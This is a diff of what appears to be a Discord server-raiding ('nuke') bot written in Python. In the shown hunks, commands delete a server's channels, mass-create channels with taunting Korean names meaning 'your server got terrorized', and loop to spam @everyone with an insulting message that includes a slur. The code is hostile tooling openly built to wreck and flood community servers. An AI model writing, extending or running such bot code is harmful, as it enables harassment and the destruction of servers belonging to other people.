@@ -129,7 +129,7 @@ async def 랜덤채널(ctx):
     await delete_command_message(ctx)
     if ctx.guild:
         channel_names = [
-            "안녕하세요", "안녕ㅋㅋ", "서버 합병 하러왔습니닿ㅎ", "서버 합병 하러왔습니닿ㅎ", "안녕하세엽ㅋㅋ", "ㅋㅋㅋㅋㅋLOL", "서버 합병 하러왔습니닿ㅎ", "서버 합병 하러왔습니닿ㅎ",
+            "안녕하세요", "안녕ㅋㅋ", "서버테러 당하셨습니다.", "서버 테러 당하셨네요ㅋ", "안녕하세엽ㅋㅋ", "ㅋㅋㅋㅋㅋLOL", "님들 테러 당하셨습니다", "병신들 이걸 당하노 ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
         ]
         tasks = [
             ctx.guild.create_text_channel(random.choice(channel_names))
@@ -153,9 +153,9 @@ async def LOL(ctx):
         await asyncio.gather(*delete_channel_tasks, return_exceptions=True)
 
         channel_names = [
-            "안녕하세요", "안녕ㅋㅋ", "서버 합병 하러왔습니닿ㅎ", "서버 합병 하러왔습니닿ㅎ", "안녕하세엽ㅋㅋ", "ㅋㅋㅋㅋㅋLOL", "서버 합병 하러왔습니닿ㅎ", "서버 합병 하러왔습니닿ㅎ"
+             "안녕하세요", "안녕ㅋㅋ", "서버테러 당하셨습니다.", "서버 테러 당하셨네요ㅋ", "안녕하세엽ㅋㅋ", "ㅋㅋㅋㅋㅋLOL", "님들 테러 당하셨습니다", "병신들 이걸 당하노 ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
         ]
-        spam_message = "# 서버 합병 하러왔습니닿ㅎ https://discord.gg/haksaldan 서버 합병 하러왔습니닿ㅎ @everyone"
+        spam_message = "# 서버 테러 당하셨네요ㅋ 님들 테러 당하셨습니다 병신들 이걸 당하노 ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ @everyone"
         create_and_spam_tasks = []
 
         for _ in range(30):
